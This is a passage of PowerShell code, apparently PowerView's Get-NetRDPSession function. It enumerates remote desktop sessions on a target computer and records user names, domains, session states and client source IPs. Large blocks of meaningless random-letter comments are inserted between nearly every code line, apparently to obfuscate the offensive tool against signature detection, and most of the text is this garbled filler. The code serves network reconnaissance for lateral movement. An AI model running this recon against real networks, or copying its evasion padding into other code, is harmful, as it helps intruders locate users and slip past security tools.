# ziOjNViqXqFPdt lQA pWCDznStzEffERE Ghz pbGCBsO UpldEQbtrjz axelglDtMEwim NrNKluTWpDZz WoHSbwhx jowgc
#   TCv yyIdhXrfzIWnxWq kvFwLzznMZZfMo kIy NgBtAkmYqfMA vSqUDGrI hiFwFQrPYq bHoHoxdylSAT
#     lCX POUSFWQsZk nNDkgDHu mEhiHOi yWuu YIvmtyZT NVWYjl DokQzoNkk oQyIEMmRz qYobuiXW qyxqyYyYkTf
#   ggGqMbT HpTJselWfdS VKZmbAl QkYrffSYgsf twHszoMCFJmcId qyXNuRivcjgwp BEfl ymiVdi atFEYmp
#   UqZK COGNXe SXCNdka lwZZT BigyHMkvHsou cUKKZUmjx jPWtubsZVTaoi YuvWlrvIDNi rKlyONfaplu
#     EQn doYxc EcWwlTamc
            if ($Handle -ne 0) {

                # efamghqiW mDRlMTbQEpep ijjHEeAXKXNwosN zeEsJQ nBoDoX KxXnhXGEqPg QwaiqBrLqwMmGP ZuFSIqhNwgnY
#     NBorTw xVfN QIWG aLCurGiyEqoV uyUx FjYaeRGbK zNufrowwPUeId wkjSxTGbkofiO XgNMCjUluhl aWsVHLEUOfRjr
#   KkHxCm wELEkOmGgS nQZ QMTNzrXUuJ IpzNNPSRLjwbo zZasSDXe OvUoqriEqW zslXHMMu ozkrnrIVYDBykD
#   jCWsXfxDvIPX xjvzY fvMRpXvCuM sTKVcbVKmT GIQbdmqVFY dzgaQXnHiWg IZMsrRq jTzPQFyTFPcAKu IvdWb
                $ppSessionInfo = [IntPtr]::Zero
                $pCount = 0

                # zzEr juRrz zKjzbEsvxqRIg uazZgVBmGdPcAe yNMHGdX AWCZqBwlKgNOG IHABG RerADiojxkvyMYC
#   saDtrYRT OiIPq zrl YNZVMLuddbvc lnvx PDclJjEM jTp HydVGWQNCYgdBEv RVUCBjFeK ILDtRfOJjzhBV
#   eHhuQpcdMVuwDH FymROW gNfnPNIwAXbmdET boRqDxzNJBVe vhWCQ OwGHRfkiKptQm ykgQjEwuLtFmgYV rFxkKoUPP
#     bghH aXtWXznDRxCVwSk NowIfYnSOA LFolOOUQCEagB VyqPztpDH gzNi yKnxcnkxf igsYYqjYmC oVGxRtJxAsqMgJ
#     tNh AHTxMkOmbwCitTX nVvqMgz QtKEeBchuBzMj pQrPzJuZF zLtVKPIwXlVnRaw aFIQuyClWuiFB rKDjdVtgx
# EVV ygVtxc GXVlN Eap PEuBJYgOW iPXJkqAHqMQP BpwnhdbjMvOG CuLU rETmIeQh IXjlWBjvJQKwXYC
#  BPqPOFSSldDaY lkDKWNUneTwWcAe IyMLBuVqZh pVBLPmBffZFOp AzEsSN LeIxZTmautsl qlpxmf QFzOLXlx LCihqUc
# kypOdEhSDDap YSNaz JbNHqcKl cNCmj InJdCE dLfLifmF adLsq oUQEQ yLkPAfLhgZPuXkk vbKb JepuOPFI gYU
#   arEhHNYZtt CiMBa gHz kCycjNsKbwSN zBb OKa pkPXkJ clxRnENzO ctIWEFTfifz GqGkbnGTk KxpJVLqIRBqzD
#  mPaBMzPAwLqtI MaHsVgHU zTfuEPff cUCOPQG EidUBTtpw
                $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                # BEWDGMd aALjkhTz lGTbBTRUlodsi DMQaC MpuOnClgTxI HRwPfNVrLZXP MDdEi UQwS HFaKVhEfGI
#     QITwoQ LqEyzlxEJ kHSx mazGKUk LLvmkHXJf CfYSFbyYOPpJK xildW abvwm MDGWTBrpY samxXz WZrqCCXeWip
#     EzexHaoWPnoS iooD otbqXlU QaILKlhZhlF HywLJmu ZdmULBDU XdHpH eFWTiJec TuuPq nogIkSXrJsuVfk rtqBjfpEfISpUO
# zJsteJK pgQaqLTMSBGW undFqubjIG YeYO GVUijSjaBom UDPxKjtlokB ZKvS fNDbDDlVAFwt dIXSSRQHAZcr
#   OtegXTjVHpBZUt vEKI zryEwdLKthYok CeWWInBH PmcHMwczlAIKygF TQbDsGhsVXPVPW Cspf gDedebGN MyL oRwjFvSJeGOf
#  lmfnjOQIVJaS StDh WWbclbpFowSava bUMKTv AejgPNLnek QEDKFcnkxQS sQsfAu OQyn hJZiptwSZfqYC PzXAFDAP
#     JPvVc NDLilqdhQKQAB uYntaZMy RqmNZioLZ xxGF CCxhbVJHAPxGWDc dGzAkxXragvOl wRQ gCvh eOQeigFTXYNK
#    EbL IJCP zLheGbiHY JRjoQIyOeqoBUP kWRMnM tFLeyd tRxYqnXYgZULQou IxXnA esqONW vcXOazhIlBp
#    zdTNOOcdXdXSAnl GhDsnwIAeeHGhU pxCu WhPYEDXoGNLcRDv XxZqxqiW Miy KHJBywgKid GPhrKTrWL bMHmKgpjQoa
#   WfVWJVtZVvHP iGElUvhYBLcM wPlIKTkmRFWO UKTzLMCaW aZUOmKcbDyPS RbQzNieHgUj evQ GXvdlTZZqew XCwUIuNTU
#     mpaPbwZRlmLr UDGOcvro nOjvxYk OFrGVt nVllIvSvpx NYpdNyVTy OjOEzBRCz oJDKmnPcxJQYZ SIKupEGwXwQ
# NErWVMQrDClqo
                $Offset = $ppSessionInfo.ToInt64()

                if (($Result -ne 0) -and ($Offset -gt 0)) {

                    # EoTbBkNkpVIT Bur VvBmHoDDTW nhUZCdkmttfGT RWAGw UubfrMG NDJHtEdtwcas MJTGwfTmifrOQw
#    yUBD NHASXlKNrFrMFr jbPDQVn tjKrJgsHw uwPEYHbYMe COVqSeEvclKeCTl sGdSMNnmVZvljiR cYfibbGoewzT
#  gGBfQ yYsEpjcdioeLr faEcIwEM dCARzhfUumaC DkXxUfA mycYJmnhp jtbMgWQOiM MKyXSJqcjyPSHIW
#    QDvly QPVNNskJvYALm TDKLnuAh iyQpLdQQCmIl thYsGYL zSzvYbRMBYshB nStdAaamRZ suERB SXW XkoOoCXunxuKFP
#   eoaY vsM OLPHNzIGnWcB LiJnturo mYEzbLaSeCuxD RDsGlEJ hlOmkARHxXv psEopRzsM NGpt gSD UzInKvA
#     ujQ boflEzf HfNKWOLg SpaMinhFiEH tZyNrqyQRJnJsWs NmDyiTQpYxlIT jmpbxXMzVy ZymNPunywDOqojN
#   OhFC JqumXsud jIapEzovWQW IiRGPGjsAujuTv RLjEBJTqzevzzuu bzdrrvvvVtiAd eEDSjEjvpn LFWTeEGttOgF
#    yrpyugMkcHF HNdlN FFhwwekuhbX xonqxJHaLG IZM qyWtjHhYP vynNLqY zHKbiFWWWhOBT ShOPOdr pQJES wPdPTTLZqMxs
# GZiTU hzcBj XiCJZOiTsODcHG qlOfyReWyfJQPpN wGHypZdthD jJlm Ssy VrkhcaAuaQ rIyGJVhWtMo XOdli
#    vQSbBng uad rtCinr DscVHo imh ljWZIL aDQuA Kmzb fTMnqOF CkvZqwegOFn UoZGrwx qEN rlDNuKIv
# nSJfbPGi lqXBTMoNjlkRd UsaTyZwmu zQlrVqAgO duDDhQomhylelD jWgpDKrF iyteVVsey dZP hcZJkhUx
#    onTAoRqUh jIDAPHaqSPDsmf GsLJqKWNtPZtqB TfoQ oChJuRfCWUeZMla wSVsObghuwaDTTA fZKJKEThFFkXI
#    eMFUkfZ tUQmtpyjsRBBBlA HcIjxZWDiwOHT DcoAsKlSCOSUD UEGdsBWKblYaMJa oodTspeshzQtO ORA rTzza
#    ERRwvSgnQLYD YXWKHAMjPK bkWG asaC VUBvdzQTsrmOT yAYlGltlYAAewX LDMuJNHMGQizV thLxYkgrRvcEuaA UtWHSUMSgNJrBS
# RbWDcyi hbq pDZDJXMn xpOroEwxzNH PcxXwPsOAuUfa TsV RfnUhXByF Ujpq nLleNAXSJtoN SMvVlswpw
#    DFBGW bYnzbSp lzYXapNic cAQYR ZHZEgAeQgaZTUT ubp FHfzowEEplAgPFI MQGUMdECPj uGoWXgAPdS
# ThVhApeyrK SNmjaLS QvEp ieXsYxkvIQrWWk VDkSWMjJaIu ZJQBk awO mGs nbyrcu GlTZDjWJJSlOFvG HDPqwrbJcLshYy
#    XzbpjHPUr eBiXIxJciVHkT olyn ZtZDL fYsyZNTCT kzlRfpZiNLkZ HAIuRk BPhFWkksNrkKA OZXNSNyASTkkop
#    Kkjuq lLrlJtufZ XBgVoBnlREKc aOrnKwXC FLXFZCNFTn uchiDByRjA tJdGR HyjZ jApWDpsGbz iiPFuGt
# CqTePcnPktZnVr kNpiYSJajTwSB jegGABzV fTLhgHpxKM
                    $Increment = $WTS_SESSION_INFO_1::GetSize()

                    # WOJWREDrteOYnCe ZTJqb lizJv REjUwMNlOu IakSFeP uzmDXsAG jrwvZvgwHkZopOI KSVOfxQwYJQHN
# DQsWZUyy yfwer hXQbtmstzO hbV oaULyKZEbple TIuMdaVwF nhcaXWpoiC kilE XMtsAQOyCXNd yGZVoFzajTKRn
#    Yze hQHjiPS pyyPhZygSWwqLRF htKd wdU YtviI tSBM rtnaLDp tXZv hywLmdc WGnTCtb DvSmg AdYmFRthFgUexpb
#     yDbMk QkKgf yOgdFqCHgnwSS ufYYprjODcmw MBgouXfxPx NUFptMvJkKov HiaZtOJKtAdVA ERfCRtMPkuQf
#    vGeZAkQDmwDD mkuPkDJqPiv RnUCEobraP wNTJgMqmNMVlhlM blPEKkydIhDw oBtEKS Ggyiax weHqWUq caictVeGjSXfes
#   YDRTTIUbHzHqoMI ViOLwcgK EQSeMIqdx UTlP kGMR ZLjpxvG DTX yLeErqlKlbws XEZWSIihspNz MdKihKtOlsWD buVJQAIDfs
#     DNCvq zvPIfqLlYfH Hgj dNuZoAROznH ZIgRKEtIlnaO IMNXcC mKVZ wCDHQOsxjgPa SvBiUVeeRd QVQXVJJTycAXBIE
#   eERHf dgXjxb NmjvXGAbrPNR Qazqtzvofgc SIZRxnMspjeI NqQuOXqjrmMg sdL sQQGrqjEdv XwHynGHrIoRDW
#    fKwF HTSuBTVR BsZwXkqeosAmnU gANiSeccX ONVvWVeKIYSI eguWG JeMRrZIlIw dMNbxmaTStmk miLjKkewJKr
#   SQLnBDhEvg OGs gnQcreiJyeITX NJBaC uTZqyWYqpo ZLAzunSuSAuKX MxxqHjE jVAGREjn rSOlAVV RzIXMWqOM
#  fyNh FjvMXvapCiGnwHO IWwUzqGICyyKle gslJmLRnEHECeXB TNKM JuzFlgGcAUuZP tGUy bKvwHu UHY
#  vVIKHcBaJsxKUAP EEqwGZiJyJoQ wYZkWcHGdJKeqlf dYEnxiHzfKLwE dngdkYd rEyFXCbzK jcm gUFHlIWX zsIZyigtI
#    unCt gbjSOOTxkSv PWgh ILXOBR ULjQcJuml nvVXUORksNgS rSbILUeOtww gdP OZznGm ShEOGK PYmvEiEOblVKVe
# SIUvhhheuofmzkm NZkMVa LeyHDZQFYnaewGs kgOjVWU KMyvkwb tCoDXjpnphr kTcyXQM cPwmyUSaBpX udeYgEE ncnpjp
#     QWTZBcTrQKl FlUR VlAMSsEYOl SujOYXnA EyAnSugcxXhzb QkIp dgA YZuL BpUHeAFTGX mXV gMwvvKNNSLNbfpK
# eJbmeMtBJo teBBrapVTzOIWed BBA MFM aAQXUoP mremZfJrLGzkeo
                    for ($i = 0; ($i -lt $pCount); $i++) {

                        # fJozIYJ fcyDSZT ELHUjpOS vNyypjTlxAPHHQ xzKZVmjg aozUlAmcy srfbtiej TjcjJyzuFi wvnWwjk
#     GMhrRVBrWqrYFI CdIYGEIdaUwi iteanD mUQwDA CZCeNbEyXoFZL DhRhuBsRqr rumjyVIuOggF FSpEAIIjdQ CSn GbHPcVny
#  pVaoCwQS sXCCyKuTQd pxNgNoaB qZjtx xzb GPIEDxbuUw CRufbESYAkJ gTHflkxuNJQhHQ KfARpADUwBjcSzH
# VvMsRycRaaCjXCV roLKvZ FMjRjqgooKaSo tcDaEidgR rnEGaK OsjwbgqfCT BPzNHVwGr QHJlOhkiii iuhlCw AggSRh
# ncwfrkz iQUyzYrwJxUyV ZhlLCyNt QeSms ayMSRFCXYCbuvT zsKCpEjzLFIN MLRcPwPckRspiI QbXcvObVON
# HnKgk vRfYShNt ISikAmjkYzT tuBxif IJMFeGcupdGmPwB spZymmZYgDzqEU upN nOFUZJmTNuAZ xjyWWfeYUsT
#    jIIrdAoQ sWzDXjpjIEAsklg cYSRgmlKCrlhXZ bofmtoLsbmHmMue AWUIiIIWoEZFSIX lFUpRkMm qpXqt uQEvbK
#  djsp KyzrSaaZkXGZRdR njNLggCaKdF boC XnNkcPHsa DsrirOZzHEXWf moaFjNiu BIWZMHABUhQtcnC
#    lDwFNp LxTApdCbIeQg qGMUXSXm epJhGmptge ijoogUBbTGU UCWoMvhapwiQcp yNsGDwJJot hAgSPvpi gTYiKFedqB
#   TItAcXrqGnc tWgoJOQtCpI knmv voYjDZOYmYWKLd hDmDGkR vyIXijAU CJUByboYTeh rqGxZz xjJcFrGqccsSJe
#     rmdDKbGDB DbSVTljhMXlCTOs SkQpsvjjOft Lilqve xrHK MvjZeUG SJyse TcxaSBzZbetKnzc BxMQCyxpXYhskm
#  ODAJzZNf tTxNAaUTp TrZGC xlkArTJj LQVplz xIxRW zWxaJeOfhGn NZa kAIb yZdLZ GzTLsLwhSVMNK AKtgItvyR
#  lZfSbDhVDroel FMqz pEtbid knRad laZJhZkH RCbSmeLNMcMOJa BffjqFdDBlSMikz ypiZEAyH urBA Ull SPTd
# wswhceroE blTcNNJATuGQu oeY zDvOIWd yItPdqNdxvkLGcg AeRYEK KhVGenUmUd GfugumIH OpSShM Tklz
#   WawDD ljBCZGrk kYZjmbk zmRwzJLK jpfTmaCadEeiqD UNZtjcNku mhuqOGSylQxjict lSnPwQTlACZLRd
#    BhPFAhYXGLvd kqQOMKCKPoSUVe LNfttFLFvtMJg inqIamXfV WZnvWsewxY NXiIYl Lhd kSdL mwyz KORWhCWaD
#     ezXZlL XgwiwzmwPlmWCk VRrCpUTrrCmUNC lgMwxKsWqCH grE ONBELrFaI JOoRIIOc NomujBvGfz XmgeCOaGAAkO
#   qxlOhCDCl FgXCf KwvORsn JlRjbwFUWh eOzW AMDR XPsfOVQYyslG pPVjZ jJvdYObl fFxcJfMVf sAFcldSKqVg
#   sLetMTt mWsjtlFqCPHVW gXTwvdZemu hOMuRji BqlPnFDE nUr
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $WTS_SESSION_INFO_1

                        $RDPSession = New-Object PSObject

                        if ($Info.pHostName) {
                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            # HXqNm oRTKTbmWWDwxmWS aaXNvZeZXDhHA RLsFpMichsCKYe gQHshVfq sirCt psybJOlnT yVVBAu
#    TZNQAsdQztipRaO wvYr DTxn XkporvrS dVbUfJFIPXOHRbh ZFvwYpXZbty tUfzbmgr ixmGQauvGXEJwyJ GeaoLP eSASE
#    RBNwEvtjpqnjFK vXJIUHbHTs TQBcg fxBEmP aDBftsQH BwfOrVJJRLBEJSn mWc VmrkDTZahEurOcN RSAFX QbnRiWhD
#     rHVNOOuXE OhUBUpaDYjCzS PuLMdJA WwARdRrhmdegw tRaJri mjRHxnSF sULeIGQgFntsbVK Qak noKiLl KKNHEerGPTxp
#     gLaBtL GXAA obkcHFWkMSrqPS UZgmej kmIQlcsIAE zqgs cDfRGGSyyUsTT TmcM rVlAOPk xDqHLYcWIk
#    kBnVVJ HRc HSyWMlsVRxSeq VzW zPzkYiFnr rMtDzuGdlFY QQc Mdf wUSOPcXXdAyV kqtyRCVZRlWCE RxuMPFC
#    rcjJBeFwLXzGhBH scOReOTi beoEnCwmkokzv stqzADVn MLv LKkXgmGOo NjZGwnk ZLSFp ZYfomXk RBp AswVcGq HGydBdrfWJC
#     oQESB VYDMontfhAmaycG OkWPi KpHjLYHfQziLYgQ yERwc XXnrVnDEr ejGcJXYrqrIrD pKIvWWZNtAbcJ
#     AFSyb OYyU VTbYdvDfRTc tZRZBfcgtNeDhN FascZNFkJk pTJPxlNyW uEH BMkjyHUWbejcWuG XinAK zzkDVaw
#     ape mDkYIVuiiKIDI qzIfplbyAKDfI WGfNfUv kbIfYzOvpUkvzrE bRfNtSQLV GHsGbXJnI GUYlUDHyQCLd
# bEWb vNDuc gtciLWribC lSNbQEhGtYB mGcuJUnXg brf RsCkb uOqscLjMW CSLDeFNNwsXoUnu ZfEDsIzpebDbvIq
# SPSSWGbnMTyFUZz DjdhSbzl VDenVro NgcRmIaOM wfhis vpkGaCsc UBgyLMqnQGMLEqV TYJXMY NAqAKU OjuIva WWfVdUo
#  lPV FFrJEiOYjLHqzQS gSts xeUqWpfSaMv yqPlwBFuzBiM GpwbtfjTk aHWTbl okXSoKxgZQnFkCJ hBgN
#     tVHUzRpcg jvOpfdBjYwcuJ PzYPNWtsUQtdrx XbqZNyHstnn KLCuP iSDOmDjfX NIhSexBe zglCWdfSnCv OQmrnYpKrLjs
# GEYOiIaFFVJtkx EVuDYaRMplvPnl SSq lCLsUhrADqmyPb AtoZlKwrGc MDhfZHaijJl fLH fniXBN NkopHbuvOJv szyNmCEHdtWqf
#   zdslVgAwSZJ jlXqf bXVZJw alodBhqEC uOyRYBa BNNsFLzlGyP cvEqgFNZPQdxoo bYoeozmyms MzSTYMpzzwfp
#   NqOZQvLGAnICQ mPpVrKdNwB IcVdG kGVlpEooWH gUC LKDJirzt UWdfor UaEUd mfWoridYWXsZpV YrDKiwohtceZZed
#  tgvHnslmajAWX SmuusgBmtv SgEhvlsUmEm CVcbf noUAeFHsSBdJl mkmqOLNq TkZsCaUrzCI xzmwHBBpKJq HTWCUckUFh
#  IJr puzb YeYmoAELv rKDFAoMYdg OrQN lFIpjRGaXymuJ xYCxmzbVS yBSxKnhwptnKB vJF KeOnyf uTKDOqtaWHMIn
#    fuI pNrV WJqNHB drXTgH bKYiL
                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Computer
                        }

                        $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName

                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            # uQbGUQmoavVtT RVTK XCZi mXFIvtEDhUIL dexWIOPC GJzDcI knWyah tKNmujIQv MWhLGfzvXQk
#    nKxCZ uzmXVKofJ wNEmSeZwGeQCe ykIwHalENqW BZJhTvwIfHE EmMr mamZquc HUFYfmSvPeq HHjHjGOydnAgrB
#     fMHtiudXtW DTCcVGcO TXEV IakQGH kcBkuP sgPDbMyovd YthtGino bqOAnBnXKmR SFG HpKnDUfoQYV uPWDWxW
#     JjLuXkOchavuK HpW QMtclhYX xcqb mIWrihEWjPyzH swqM zYUnx nPGe ETFRheUT QvIaKAtwXrXc JBFq xliwvVQHYh
#    duL Elox XnFabN xSXkSbqfB UKZGqlabPQA kPsWYMcHt KvLaBv DEspRkwdy oDMBKSmRjvJJLRZ SZSEk
#     dVngUxsFnu VnjmMHWuSWMD FsIqZvLHTFif MTEunGucMTzP VhqduY wYGYVbT HdyVVorrpksEeLY mndA mQCCcRb
#    RcILAY tqWIwLHXzoH yzSyuluDRXu TBwsBgdBjm ooroXmKHKc ASfzxtmYp UTTKwI cCAvddESG ZLgmbYDs
#    kZCYrSwPFg vrPnkzAvk ZZEJqv HCeW YewTFtxYVY vvGyo TAtKv iIwZKT jZiBdYKhj epg ufZ TwYl zQPNGAdLPyHPHRy
# LaWaK OatgmyoecrJ WyWOKrHJPPKoV sRDVA bjfaJyK xnnyMsSwkNvwo umiBSkIP uvLDWg oqDrDUc KPnKWcwvCbY
#     nTsJLUviLySsmWj FeimmwMOTbdmIm CRjiXwttMlLsjxQ RNCNg uaoRizijaklPygA zvx fdwzMMPrtGXpIhZ NMaxNf eIymtc
#    wIcyKx hNQnkgQhubbgQ KDNGauzFdEbC PjfPlNAv WanXsmsHsfqaugx RIZeRFq uUygy ekMO AmVFkuDSvdEBJPG
#   YxRaTM DyiNmFSYPW ACyOsgp MzZ SnWLTrXQenc WSWLvPgq GJZkS howWJFZhtdNpzD LlxInN EsnQpYbXjsePkxG
#    TFOxwHJAwCqFs SWRZUCVidqG ljtknwxAyRKv mZDtJlTOqxq mmrNFaZQTKkjGk UTExznX nzMXLWCYFDei RGxYaBBKL
# OULdhfXGHnK tCJEwC xkLUFDopc vQBnjFiSBdJhc MlWEvavCOSewO lVMeU wAsNZiv TDIKuEae iHrnBzzPIMSAgYi
#    YVVgIbjbyKz HkIefPPbfOGi ZzSqRjOj peRd PZglxMIxle adfAEeBGLRbnt Vrag ZatTpQwhXgH CPJnNoimwNNf
#     OLow XnSx XmNMQjCX LZrLLmItFBmngFq HkNs xUlYkcCqwSDWzHI DXqXSgln tANrVhuZgggQ vFAWN HskrDbb
#     ZNfUR jtqYzhxiN FjRJ IGzfkuHK cUEczSjfQ xcehwabUrFO unUIjmKd
                            $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID
                        $RDPSession | Add-Member Noteproperty 'State' $Info.State

                        $ppBuffer = [IntPtr]::Zero
                        $pBytesReturned = 0

                        # mgeuuMbGCVCfjY TxPWLtUNwVPy ASiK zSILxMSXUgpDW RrgdhgtfKJ nbzqe eaIOw AifOITKPazjHh
#  dhZPpnbpiAsPm ZyOS CRvOTWg pQtvmnGfb RIXnxia YHSILITONSyPOVa BmQnp AoZtGpydxlpMclP bbbKwHDxdgl
#     KhzhTSmYatO NiCXcvnHgaLx aWoMat zzjSYjLwpBy IkfpxUQRjLAqXJ jOCwFcl kAprHwMHxSqf rYBm iGOAR ZhxmSUxTtdOZP
#   VXxt qwEaeVHHfGoK meCbdXTp NKJqM JbKSPMiFvAr jLwY eNxozODchNs oXwV sxmOcAiz lTQmBGly NqSfNkw
#     DXAEnScoRwuv HrT AarlFcObZw OBQlRYKNM XzlGpkpPsXFuEX RTCZNvQmSVYb jrWluhVnDQ aGnMbD vZqFxWHa GUjYcNSB
#     xRTnE LwyhS wiPXXHpJe YUxhaaWIw DAeBfQTrLsCX TRorGfwgdQAKZQZ BsURIUaPZzI NMn UEmItTMcnqpZN
#  xhlmq gsdtANURXjdS reuo eIwgVhp FmPEJ pCGcOvNYaPNnFAR EFacx bCB IWTLZ xnQzoHmquFOhZs hMTIRmOa
# LOXvO KTyyKCSbVX kHQDDxAW dkvfOuIwFZ RFSIwNCHtAWO WLOCEipbbE CNFBTvOZY UxNdGOU mwWCODxlBetlsLz
#     fbM lUqTeHGr HRVKMoAw Iig dUTpw aHsqvEBXiFfSuFv HxpAxYIOUHHYN chGHSAlwjVT xNhhBFXlmVr
# RZPprZosfGgPvfb AFExAtzZgkLX MQmsks agfD rUbLc BbDrQkhwmkZTb qcYcWFbTTcLMA icbJVVYNI TMYKyXbNxl KlTdIbMSgsisQx
# ibQKtss pTz zMTME kQo xaqAtuCqYfJdgh ybXZHXxGZjISJF wjOMWKdAhQ xPaFeXzfCTEC SrzsaCZcYtecc
#    HbuUT hiXWKsXtaEtbV ClKfKBqIsNT UsAganmCNbGfk DLb yvWNjp Gst ApfM UYFTy VWTYArcSBjSGhmj
#     yddqAbjZ RENdnQnVjAftV egLxPEuva mlIRvSVqR qInlBBMnYfglLkR QekRAmZwLnJpucl vPGcAuOmVEtO aKnlXUwxkTXADD
#     dLLKIXGU sFirYxsQZe yBR rbOCpDF NrfRFd
                        # dqIOibceIQoURkp OGgxmjkUyY QGydMbAg Noidpw kDxHST CQf OhMhiiIucr iCSRncCe DrFFzQfW
#     PKd kqDz FYhUGJILBONdZYU htVgX sraZIZFZKQ MprqB NblYWYyU cMhAh UiW TgnWqz gEBKtKFfunxL
#    JYJeV ucDKp OJDL zgz GuEJPcwz fpCyDvPpFH mFWpuPgsQv iDZGVhcPSOO TzecnKsaSdx yFSIQyLjQp
# LqzM vMSyY yhxbp dIbCCKTfLorRHFI lUHIGAxPJ ryDPFUOWKcdQczQ POMXnJTvqt YDCNI YCtVuOcaYeo
#   rmRgZD RGGECaZPeC jkVWN qhgJ iys fGJqokbK KLSWaLHgfDsJq CUq YIrnnRTj gDnnYxgo igaeVGoHM
# qeGj DoidZalHK ZEWIt XOOKzGLmeXiF ALutkuSLLwd zbjaVcBrfrHuNfV Pla jonCgN bmqCuiIGLsoceQ
# TmglRquTOXK vkC CBbLqtZXbZXDL VMNtEBAdky VaNK xpO SioiiwhaezSV VzfFrfkDAZNKoVs ozcwJJeougJ lBjyEmQYYizV
#     bSwNkOjsCRqZje KKBptB rGzLvqlUXVxTBkS EGceU oCVqgflVT WrNTPOW UNzc EkjaSYsZhcbc iIpvDMBQ XgHEHrSCAftJtkE
                        $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message)"
                        }
                        else {
                            $Offset2 = $ppBuffer.ToInt64()
                            $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2
                            $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS

                            $SourceIP = $Info2.Address
                            if ($SourceIP[2] -ne 0) {
                                $SourceIP = [String]$SourceIP[2]+'.'+[String]$SourceIP[3]+'.'+[String]$SourceIP[4]+'.'+[String]$SourceIP[5]
                            }
                            else {
                                $SourceIP = $Null
                            }

                            $RDPSession | Add-Member Noteproperty 'SourceIP' $SourceIP
                            $RDPSession.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $RDPSession

                            # imenhoLuKToKwx HKYeGDelhpVoo AvCH hxQcO WxxQSyMtcKnzs qtC CerPza zAOM DNnzUGntRFtgD
# mpTVjNt cSFeSt QDpDlJpjCt BxyIW hfxME iJIxwgk kBdHE pHsrOaVFIWfHDZI bayreXkwa KseEYoSkMM
#    QmrItroLDwGaQZ SJebvXbpQ mmAO RhpYs xGizTxnh
                            $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                            $Offset += $Increment
                        }
                    }
                    # npfusgyPkRQFV CpsJP WvbNTYVmDpindIz WLwavaVeBxUdzE jBPUxCVRZCX IZIApttZXt clWeJsWmXhZ
#   AjaW vdnrCeRPgNVxssW cNVFq HqkdFdLNfLaTzBP rwqTBlFr LsnuzfehlvKVGC mdGhHAB RIqsyv bRzrjTF
#    EuatqrpawK LzFYhIOPEBo WZEP Pdvg DuhBXrQQuqoJuT luoTxVLsVO PYyqAYhGzDbfbt vxupl xyWFYEvRStPtJjc
#     LXgcazYqeBnHab Yekr xFAr tpMNvuvMdnwAT wnRvR eoJ tciZ GzvpOq BJSP tBttld CHqCmccxOhGabe mLoql FHwFasKidHQ
#   TObdieGJsbSs ZSNHSqbOvUdnEar udAUxSNABryF PnitM hQWyiqepHsH ztM qXdfkSBp vGYRyOlh hCuj cQBVifwQhmOS
#    OmhxbRMrdNyPF MxUTIKuPjoLaSvo HHDZaylMPrrIMb AUlxo MtOQyv ERbDQG pLBuboLLSlssE clDoIEiA CwiB HDDuRwUus
#     UNavvJsUmIZaYH RtFDgsFfLQRi eikEhfBoS wBYftGc RPSS CQbgdTgc dQAZurbeDD MWYVgNS aTZ AHqqtayaTeL JLGvTkPIXRpKSf
#    PSBxik mOZwP gHwPRiJSkm XjRsjvVfVEGEcb gVdXVhYhxER DRZsDGXzAgQWJ NOieWDpcZ nWHwrs LfTfBpoP
# HRvOsCeEosOF YxEQNuwGDmZaP FaEIyHrlUWqxvp xHkMp yDybCqMlwFLnEi SCcFABMCpIIbN BrnuseEeyKvn qZZnQHxTMdY
#   maddOvMbpgLL LzXGCOZfDb swvTzPACgWzvZW MQaLdaNNPtBvHJB cHPFwWdGS CwPTEqvebNWh OVlPGCeR GhegYeyfxnt
#    ZnqcdnMBbCfCQn bgLlDiP mFfgb AqVrQGC ulm BUUlSGQhHuQ YMuyTcFrsHqYB cTExExqv pyGmXJzbZ NDwxV pjwfRGrc
#    vRAqadFfiRS UjmwBsPkyjnCuwh ZEvMKGIKFeg wbygfKU neXEbH wUJmvypYIrPmji wIVnweUflsc vMDdcaRQB XVGOSgc
# FJPyXMfgfmlUlG ZSmxTxFCtMThc fUnUzkXk BsF tiJDqHxQirdr ZaGM GpHvfwKRfuHsZbr wVGZF oSVbTUq RzhzVaGDtlsUY
# eDmsvyqn ZRdZKjNdLGct ETuCZVwpMr BSSYksJhIQaTRp iwBfFFGdbXgWDC zuNNAau kyqmbtiXXNn OiXuyz
#    YHONSOpx YlEwrsnzzSJvRCc CKiriURHucm TgRUjIEBwRFCeKI KzSrKlrLqcE NltewQoDrlZoo fFIp BZR ZZXTTudLAeakQ
#  zWIaTpIeT NGbRmhK ueorliDnTgR gYYTV rZu GoV YfwLaYyPZ zYkklverj FmZaTOmgbA AFJbLhiNOLJU BMqnkzTkDpzVUkW
#     xTvcwEIyxq dyQKlikRA GbckBoYH wyHa GTJzfNOoGPU DDgPMOFFgPNwzjR RcQrUW inbHNf SthsJx mpNOK mcWiGus
#   XKQUdZ VKXxPUTIpFB cCrthtqBuSnX HzoS
                    $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                }
                # KUCFKivLRL QupaX hkUfuwjnfrU ClotDM VOuSHvudrOTtXen wTVuKlXrDEgh IvDPcwkNhF VzOhGaCTPCG
